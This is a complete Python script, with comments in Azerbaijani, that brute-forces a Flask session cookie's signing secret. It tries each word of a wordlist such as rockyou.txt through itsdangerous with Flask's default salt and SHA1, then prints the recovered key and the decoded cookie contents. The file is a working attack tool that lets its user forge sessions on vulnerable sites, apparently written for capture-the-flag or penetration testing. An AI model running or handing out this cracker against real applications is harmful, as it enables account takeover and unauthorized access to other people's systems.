import hashlib
import os
import sys
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# Read the cookie from env var or CLI arg — never hardcode session tokens
cookie = os.environ.get('TARGET_COOKIE') or (sys.argv[1] if len(sys.argv) > 1 else None)
if not cookie:
    print("Usage: TARGET_COOKIE=<cookie> python brute.py")
    print("   or: python brute.py <cookie> [wordlist_path]")
    sys.exit(1)

wordlist_path = (sys.argv[2] if len(sys.argv) > 2 else
                 os.environ.get('WORDLIST_PATH', '/usr/share/wordlists/rockyou.txt'))

print("[*] Brute-force başladılır...")

try:
    with open(wordlist_path, 'r', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            
            # Boş sətirləri keçirik
            if not secret:
                continue
                
            try:
                # Flask standart olaraq salt='cookie-session' və sha1 istifadə edir
                s = URLSafeTimedSerializer(
                    secret, 
                    salt='cookie-session',
                    signer_kwargs={
                        'key_derivation': 'hmac',
                        'digest_method': hashlib.sha1
                    }
                )
                
                # max_age parametrini böyük qoyuruq ki, köhnə kukilərdə "vaxtı keçib" xətası verməsin
                data = s.loads(cookie, max_age=86400 * 365 * 10)
                
                print(f'\n[+] SECRET KEY TAPILDI: {secret}')
                print(f'[+] Kuki daxilindəki məlumat: {data}')
                break
                
            except (BadSignature, SignatureExpired):
                # Açarı səhvdirsə və ya vaxtı keçibsə dövr davam edir
                pass
            except Exception as e:
                # Əgər kukinin formatı tamamilə səhvdirsə, burada dayandırırıq
                print(f"\n[-] Kuki formatında xəta var: {e}")
                print("Zəhmət olmasa kukini tam kopyaladığınızdan əmin olun.")
                break
        else:
            print("\n[-] Təəssüf, wordlist-də uyğun gizli açar tapılmadı.")

except FileNotFoundError:
    print(f"[-] Xəta: {wordlist_path} faylı tapılmadı!")
